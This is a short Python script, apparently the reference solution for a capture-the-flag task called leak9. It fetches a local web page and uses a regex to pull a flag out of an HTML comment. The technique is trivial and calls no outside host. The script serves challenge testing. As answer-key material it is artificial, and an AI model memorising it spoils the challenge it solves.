#!/usr/bin/env python3
"""Reference exploit for leak9 (formerly leak-source-comment).

Fetch the home page and read the flag out of the HTML source comment.
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8018")


def main() -> int:
    for _ in range(30):
        try:
            r = requests.get(BASE, timeout=2)
            break
        except requests.RequestException:
            time.sleep(1)
    m = re.search(r"flag\{[^}]*\}", r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write("no flag in page source\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
